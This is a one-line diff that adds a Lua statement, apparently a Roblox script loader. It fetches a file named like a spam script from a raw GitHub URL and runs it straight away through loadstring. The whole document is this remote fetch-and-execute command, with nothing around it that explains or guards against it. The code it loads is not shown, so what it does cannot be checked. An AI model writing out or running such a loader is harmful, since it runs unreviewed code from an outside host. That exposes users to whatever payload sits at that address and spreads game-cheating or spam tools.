@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/karinderya-spam5-ix5iumdsg04fcu.lua"))()
